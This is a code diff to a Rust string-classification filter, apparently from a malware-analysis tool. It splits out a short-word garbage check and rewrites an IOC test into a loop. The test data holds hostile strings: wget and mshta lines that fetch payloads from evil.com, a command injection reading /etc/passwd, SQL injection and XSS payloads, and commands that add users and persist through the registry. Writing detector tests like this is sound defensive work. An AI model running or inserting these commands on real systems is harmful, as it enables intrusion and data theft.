@@ -1418,29 +1418,13 @@ fn is_recognized_ioc(s: &str, len: usize) -> bool {
     false
 }
 
-/// Perform statistical analysis to determine if string is garbage.
-///
-/// This is the fallback when fast paths and IOC recognition don't apply.
-fn is_statistical_garbage(
-    s: &str,
-    len: usize,
-    stats: &CharStats,
-    ctx: &crate::types::StringContext,
-) -> bool {
-    // Short pattern checks
-    if is_short_identifier_garbage(s, len, stats) {
-        return true;
-    }
-
-    // Repeating digit patterns like "537353W353" - digits repeat in a pattern with few letters
-    // Exception: hex addresses like "0x12345678" are valid
-    if len >= 8 && stats.digit >= 6 && stats.alpha <= 2 {
-        let is_hex_address = s.starts_with("0x") || s.starts_with("0X");
-        if !is_hex_address {
-            return true;
-        }
-    }
-
+/// Whether a string of at most ten characters fails to look like a word,
+/// code or number: no vowels among lowercase and digits (`gvjc54`), rare
+/// shapes of short lowercase words (`oujr`, `kmnro`), doubled endings in short
+/// uppercase (`ZYII`), digit-suffixed fragments (`kmo8`), repeated digits
+/// (`3333`), noise punctuation, unbalanced brackets, and case-and-digit mixes
+/// that are neither versions nor word-like (`A1b2c3`).
+fn is_short_word_garbage(s: &str, len: usize, stats: &CharStats) -> bool {
     // Short strings (4-10 chars) with mixed case and digits that don't look like identifiers
     // e.g., "gvjc54" - lowercase + digit but no vowels and doesn't follow naming conventions
     if (4..=10).contains(&len) && stats.lower > 0 && stats.digit > 0 && stats.upper == 0 {
@@ -1500,11 +1484,6 @@ fn is_statistical_garbage(
         }
     }
 
-    // Strings with multiple consecutive quotes are likely misaligned data
-    if s.contains("\"\"") || s.contains("'''") {
-        return true;
-    }
-
     // Note: Short digit+uppercase 4-char patterns like "8BIM", "0GZF" are often legitimate
     // identifiers (file signatures, codes). We don't filter them to avoid false positives.
     // is_short_identifier_garbage already handles these via is_digit_upper_id check.
@@ -1562,29 +1541,11 @@ fn is_statistical_garbage(
         return true;
     }
 
-    // Pattern: ends with backtick + single letter (Go misaligned reads)
-    let bytes = s.as_bytes();
-    if len >= 2
-        && let Some(idx) = bytes.iter().rposition(|&b| b.is_ascii_alphabetic())
-        && idx > 0
-        && bytes[idx - 1] == b'`'
-    {
-        return true;
-    }
-
     if len <= 4 && stats.alphanumeric < len / 2 {
         return true;
     }
 
     if len <= 8 && (stats.open_parens != stats.close_parens || stats.quotes == 1) {
-        return true;
-    }
-
-    if is_short_binary_garbage(s, len, stats) {
-        return true;
-    }
-
-    if is_x86_save_sequence_fragment(s, len, stats, ctx) {
         return true;
     }
 
@@ -1599,6 +1560,59 @@ fn is_statistical_garbage(
         if !looks_like_version && !looks_like_word_like(s, len, stats) {
             return true;
         }
+    }
+
+    false
+}
+
+/// Perform statistical analysis to determine if string is garbage.
+///
+/// This is the fallback when fast paths and IOC recognition don't apply.
+fn is_statistical_garbage(
+    s: &str,
+    len: usize,
+    stats: &CharStats,
+    ctx: &crate::types::StringContext,
+) -> bool {
+    // Short pattern checks
+    if is_short_identifier_garbage(s, len, stats) {
+        return true;
+    }
+
+    // Repeating digit patterns like "537353W353" - digits repeat in a pattern with few letters
+    // Exception: hex addresses like "0x12345678" are valid
+    if len >= 8 && stats.digit >= 6 && stats.alpha <= 2 {
+        let is_hex_address = s.starts_with("0x") || s.starts_with("0X");
+        if !is_hex_address {
+            return true;
+        }
+    }
+
+    if is_short_word_garbage(s, len, stats) {
+        return true;
+    }
+
+    // Strings with multiple consecutive quotes are likely misaligned data
+    if s.contains("\"\"") || s.contains("'''") {
+        return true;
+    }
+
+    // Pattern: ends with backtick + single letter (Go misaligned reads)
+    let bytes = s.as_bytes();
+    if len >= 2
+        && let Some(idx) = bytes.iter().rposition(|&b| b.is_ascii_alphabetic())
+        && idx > 0
+        && bytes[idx - 1] == b'`'
+    {
+        return true;
+    }
+
+    if is_short_binary_garbage(s, len, stats) {
+        return true;
+    }
+
+    if is_x86_save_sequence_fragment(s, len, stats, ctx) {
+        return true;
     }
 
     // Consistent-case alphanumeric patterns (7-8 chars) are valid identifiers
@@ -2404,228 +2418,149 @@ mod tests {
 
     #[test]
     fn test_is_garbage_ransomware_and_ctf_iocs() {
-        // IOCs commonly found in ransomware and CTF challenges should NOT be garbage
-
-        // Cryptocurrency wallet addresses
-        assert!(
-            !is_garbage("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"),
-            "Bitcoin address (legacy)"
-        );
-        assert!(
-            !is_garbage("3J98t1WpEZ73CNmYviecrnyiWrnqRhWNLy"),
-            "Bitcoin address (P2SH)"
-        );
-        assert!(
-            !is_garbage("bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq"),
-            "Bitcoin address (bech32)"
-        );
-        assert!(
-            !is_garbage("0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb"),
-            "Ethereum address"
-        );
-        assert!(
-            !is_garbage(
-                "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A"
+        // IOCs commonly found in ransomware and CTF challenges should NOT be garbage.
+        for (s, what) in [
+            // Cryptocurrency wallet addresses
+            (
+                "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
+                "Bitcoin address (legacy)",
             ),
-            "Monero address"
-        );
-        assert!(
-            !is_garbage("LdP8Qox1VAhCzLJNqrqPRHWXpnRAjRUa4L"),
-            "Litecoin address"
-        );
-        assert!(
-            !is_garbage("DH5yaieqoZN36fDVciNyRueRGvGLR3mr7L"),
-            "Dogecoin address"
-        );
-
-        // Cryptocurrency mining pools and stratum URLs
-        assert!(!is_garbage("pool.minexmr.com:4444"), "Monero mining pool");
-        assert!(!is_garbage("xmr-eu1.nanopool.org:14444"), "Nanopool XMR");
-        assert!(
-            !is_garbage("eth-us-east1.nanopool.org:9999"),
-            "Nanopool ETH"
-        );
-        assert!(
-            !is_garbage("stratum+tcp://pool.supportxmr.com:3333"),
-            "Stratum URL"
-        );
-        assert!(
-            !is_garbage("stratum+ssl://xmr.pool.minergate.com:45700"),
-            "Stratum SSL"
-        );
-
-        // Cryptocurrency miner software names and commands
-        assert!(!is_garbage("xmrig"), "XMRig miner");
-        assert!(!is_garbage("xmr-stak"), "XMR-Stak miner");
-        assert!(!is_garbage("cpuminer-multi"), "CPU miner");
-        assert!(!is_garbage("ccminer"), "CUDA miner");
-        assert!(!is_garbage("ethminer"), "Ethereum miner");
-        assert!(!is_garbage("PhoenixMiner"), "Phoenix miner");
-        assert!(!is_garbage("t-rex"), "T-Rex miner");
-        assert!(!is_garbage("--donate-level=1"), "Miner donate flag");
-        assert!(
-            !is_garbage("-o pool.minexmr.com:4444 -u"),
-            "Miner command line"
-        );
-        assert!(!is_garbage("--algo=cryptonight"), "Mining algorithm");
-        assert!(!is_garbage("--cuda-devices=0,1"), "GPU device selection");
-
-        // Tor/Onion URLs (common in ransomware)
-        assert!(!is_garbage("http://thehiddenwiki.onion"), "Onion URL HTTP");
-        assert!(
-            !is_garbage("https://3g2upl4pq6kufc4m.onion"),
-            "Onion URL DuckDuckGo"
-        );
-        assert!(!is_garbage("ransomware2x4ytmz.onion"), "Onion domain only");
-
-        // CTF flag formats
-        assert!(!is_garbage("CTF{th1s_1s_4_fl4g}"), "CTF flag format");
-        assert!(
-            !is_garbage("flag{base64_encoded_secret}"),
-            "flag{{}} format"
-        );
-        assert!(
-            !is_garbage("picoCTF{b1n4ry_3xpl01t4t10n}"),
-            "picoCTF format"
-        );
-        assert!(!is_garbage("HTB{h4ck_th3_b0x}"), "HackTheBox format");
-        assert!(!is_garbage("FLAG{SQL_1nj3ct10n_pwn3d}"), "FLAG{{}} format");
-
-        // Email addresses (used in ransomware contact)
-        assert!(!is_garbage("decrypt@protonmail.com"), "Ransomware email");
-        assert!(!is_garbage("recover.files@tutanota.com"), "Recovery email");
-        assert!(!is_garbage("unlock_data@cock.li"), "Contact email");
-
-        // Ransomware file extensions
-        assert!(!is_garbage(".locked"), "Locked extension");
-        assert!(!is_garbage(".encrypted"), "Encrypted extension");
-        assert!(!is_garbage(".crypted"), "Crypted extension");
-        assert!(!is_garbage(".wannacry"), "WannaCry extension");
-        assert!(!is_garbage(".ryuk"), "Ryuk extension");
-        assert!(!is_garbage(".locky"), "Locky extension");
-
-        // Mutex/synchronization names (often weird strings)
-        assert!(
-            !is_garbage("Global\\MsWinZonesCacheCounterMutexA"),
-            "Windows mutex"
-        );
-        assert!(
-            !is_garbage("{8F6F0AC4-B9A1-45fd-A8CF-72997C3991B}"),
-            "GUID mutex"
-        );
-
-        // Windows registry paths
-        assert!(
-            !is_garbage("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
-            "Registry run key"
-        );
-        assert!(
-            !is_garbage("HKCU\\Software\\Classes\\exefile\\shell\\open\\command"),
-            "Registry exefile"
-        );
-
-        // SQL injection payloads (CTF/pentesting)
-        assert!(!is_garbage("' OR '1'='1"), "SQL injection basic");
-        assert!(!is_garbage("admin'--"), "SQL comment injection");
-        assert!(
-            !is_garbage("1' UNION SELECT NULL,NULL,NULL--"),
-            "SQL union injection"
-        );
-
-        // XSS payloads
-        assert!(!is_garbage("<script>alert(1)</script>"), "XSS basic");
-        assert!(!is_garbage("<img src=x onerror=alert(1)>"), "XSS img tag");
-        assert!(
-            !is_garbage("javascript:alert(document.cookie)"),
-            "XSS javascript protocol"
-        );
-
-        // Command injection patterns
-        assert!(
-            !is_garbage("; cat /etc/passwd"),
-            "Command injection semicolon"
-        );
-        assert!(!is_garbage("| whoami"), "Command injection pipe");
-        assert!(!is_garbage("`id`"), "Command injection backticks");
-        assert!(
-            !is_garbage("$(wget http://evil.com/shell.sh)"),
-            "Command injection wget"
-        );
-
-        // Persistence mechanisms
-        assert!(
-            !is_garbage("schtasks /create /tn \"WindowsUpdate\" /tr"),
-            "Scheduled task"
-        );
-        assert!(
-            !is_garbage("net user hacker password123 /add"),
-            "User creation"
-        );
-        assert!(
-            !is_garbage("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
-            "Registry persistence"
-        );
-
-        // Common malware/CTF tools signatures
-        assert!(!is_garbage("powershell -enc"), "PowerShell encoded");
-        assert!(
-            !is_garbage("IEX(New-Object Net.WebClient).DownloadString"),
-            "PowerShell download"
-        );
-        assert!(
-            !is_garbage("certutil -urlcache -split -f"),
-            "Certutil download"
-        );
-        assert!(
-            !is_garbage("mshta http://evil.com/payload.hta"),
-            "Mshta execution"
-        );
-
-        // JWT tokens (common in web CTFs)
-        assert!(
-            !is_garbage(
-                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
+            (
+                "3J98t1WpEZ73CNmYviecrnyiWrnqRhWNLy",
+                "Bitcoin address (P2SH)",
             ),
-            "JWT token"
-        );
-
-        // RSA/PEM keys (truncated for test)
-        assert!(!is_garbage("-----BEGIN PUBLIC KEY-----"), "PEM header");
-        assert!(!is_garbage("-----END PRIVATE KEY-----"), "PEM footer");
-        assert!(
-            !is_garbage("MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA"),
-            "RSA key data"
-        );
-
-        // Ransom note patterns
-        assert!(
-            !is_garbage("YOUR FILES HAVE BEEN ENCRYPTED"),
-            "Ransom message"
-        );
-        assert!(!is_garbage("Send $500 in Bitcoin to"), "Ransom demand");
-        assert!(
-            !is_garbage("DECRYPT-INSTRUCTIONS.txt"),
-            "Ransom note filename"
-        );
-        assert!(!is_garbage("HOW-TO-DECRYPT.html"), "Decrypt instructions");
-
-        // LDAP/AD paths
-        assert!(!is_garbage("LDAP://CN=Users,DC=domain,DC=com"), "LDAP path");
-        assert!(
-            !is_garbage("CN=Administrator,CN=Users,DC=corp,DC=local"),
-            "AD distinguished name"
-        );
-
-        // API keys/secrets patterns (should preserve structure even if fake)
-        assert!(!is_garbage("AKIA0123456789ABCDEF"), "AWS access key format");
-        assert!(
-            !is_garbage("ghp_0123456789abcdefghijklmnopqrstuv"),
-            "GitHub token format"
-        );
-        assert!(
-            !is_garbage("sk_live_0123456789abcdefghijklmn"),
-            "Stripe secret key"
-        );
+            (
+                "bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq",
+                "Bitcoin address (bech32)",
+            ),
+            (
+                "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb",
+                "Ethereum address",
+            ),
+            (
+                "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A",
+                "Monero address",
+            ),
+            ("LdP8Qox1VAhCzLJNqrqPRHWXpnRAjRUa4L", "Litecoin address"),
+            ("DH5yaieqoZN36fDVciNyRueRGvGLR3mr7L", "Dogecoin address"),
+            // Cryptocurrency mining pools and stratum URLs
+            ("pool.minexmr.com:4444", "Monero mining pool"),
+            ("xmr-eu1.nanopool.org:14444", "Nanopool XMR"),
+            ("eth-us-east1.nanopool.org:9999", "Nanopool ETH"),
+            ("stratum+tcp://pool.supportxmr.com:3333", "Stratum URL"),
+            ("stratum+ssl://xmr.pool.minergate.com:45700", "Stratum SSL"),
+            // Cryptocurrency miner software names and commands
+            ("xmrig", "XMRig miner"),
+            ("xmr-stak", "XMR-Stak miner"),
+            ("cpuminer-multi", "CPU miner"),
+            ("ccminer", "CUDA miner"),
+            ("ethminer", "Ethereum miner"),
+            ("PhoenixMiner", "Phoenix miner"),
+            ("t-rex", "T-Rex miner"),
+            ("--donate-level=1", "Miner donate flag"),
+            ("-o pool.minexmr.com:4444 -u", "Miner command line"),
+            ("--algo=cryptonight", "Mining algorithm"),
+            ("--cuda-devices=0,1", "GPU device selection"),
+            // Tor/Onion URLs (common in ransomware)
+            ("http://thehiddenwiki.onion", "Onion URL HTTP"),
+            ("https://3g2upl4pq6kufc4m.onion", "Onion URL DuckDuckGo"),
+            ("ransomware2x4ytmz.onion", "Onion domain only"),
+            // CTF flag formats
+            ("CTF{th1s_1s_4_fl4g}", "CTF flag format"),
+            ("flag{base64_encoded_secret}", "flag{{}} format"),
+            ("picoCTF{b1n4ry_3xpl01t4t10n}", "picoCTF format"),
+            ("HTB{h4ck_th3_b0x}", "HackTheBox format"),
+            ("FLAG{SQL_1nj3ct10n_pwn3d}", "FLAG{{}} format"),
+            // Email addresses (used in ransomware contact)
+            ("decrypt@protonmail.com", "Ransomware email"),
+            ("recover.files@tutanota.com", "Recovery email"),
+            ("unlock_data@cock.li", "Contact email"),
+            // Ransomware file extensions
+            (".locked", "Locked extension"),
+            (".encrypted", "Encrypted extension"),
+            (".crypted", "Crypted extension"),
+            (".wannacry", "WannaCry extension"),
+            (".ryuk", "Ryuk extension"),
+            (".locky", "Locky extension"),
+            // Mutex/synchronization names (often weird strings)
+            ("Global\\MsWinZonesCacheCounterMutexA", "Windows mutex"),
+            ("{8F6F0AC4-B9A1-45fd-A8CF-72997C3991B}", "GUID mutex"),
+            // Windows registry paths
+            (
+                "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+                "Registry run key",
+            ),
+            (
+                "HKCU\\Software\\Classes\\exefile\\shell\\open\\command",
+                "Registry exefile",
+            ),
+            // SQL injection payloads (CTF/pentesting)
+            ("' OR '1'='1", "SQL injection basic"),
+            ("admin'--", "SQL comment injection"),
+            ("1' UNION SELECT NULL,NULL,NULL--", "SQL union injection"),
+            // XSS payloads
+            ("<script>alert(1)</script>", "XSS basic"),
+            ("<img src=x onerror=alert(1)>", "XSS img tag"),
+            (
+                "javascript:alert(document.cookie)",
+                "XSS javascript protocol",
+            ),
+            // Command injection patterns
+            ("; cat /etc/passwd", "Command injection semicolon"),
+            ("| whoami", "Command injection pipe"),
+            ("`id`", "Command injection backticks"),
+            ("$(wget http://evil.com/shell.sh)", "Command injection wget"),
+            // Persistence mechanisms
+            (
+                "schtasks /create /tn \"WindowsUpdate\" /tr",
+                "Scheduled task",
+            ),
+            ("net user hacker password123 /add", "User creation"),
+            (
+                "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+                "Registry persistence",
+            ),
+            // Common malware/CTF tools signatures
+            ("powershell -enc", "PowerShell encoded"),
+            (
+                "IEX(New-Object Net.WebClient).DownloadString",
+                "PowerShell download",
+            ),
+            ("certutil -urlcache -split -f", "Certutil download"),
+            ("mshta http://evil.com/payload.hta", "Mshta execution"),
+            // JWT tokens (common in web CTFs)
+            (
+                "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
+                "JWT token",
+            ),
+            // RSA/PEM keys (truncated for test)
+            ("-----BEGIN PUBLIC KEY-----", "PEM header"),
+            ("-----END PRIVATE KEY-----", "PEM footer"),
+            (
+                "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA",
+                "RSA key data",
+            ),
+            // Ransom note patterns
+            ("YOUR FILES HAVE BEEN ENCRYPTED", "Ransom message"),
+            ("Send $500 in Bitcoin to", "Ransom demand"),
+            ("DECRYPT-INSTRUCTIONS.txt", "Ransom note filename"),
+            ("HOW-TO-DECRYPT.html", "Decrypt instructions"),
+            // LDAP/AD paths
+            ("LDAP://CN=Users,DC=domain,DC=com", "LDAP path"),
+            (
+                "CN=Administrator,CN=Users,DC=corp,DC=local",
+                "AD distinguished name",
+            ),
+            // API keys/secrets patterns (should preserve structure even if fake)
+            ("AKIA0123456789ABCDEF", "AWS access key format"),
+            (
+                "ghp_0123456789abcdefghijklmnopqrstuv",
+                "GitHub token format",
+            ),
+            ("sk_live_0123456789abcdefghijklmn", "Stripe secret key"),
+        ] {
+            assert!(!is_garbage(s), "{what}: {s}");
+        }
     }
 
     #[test]
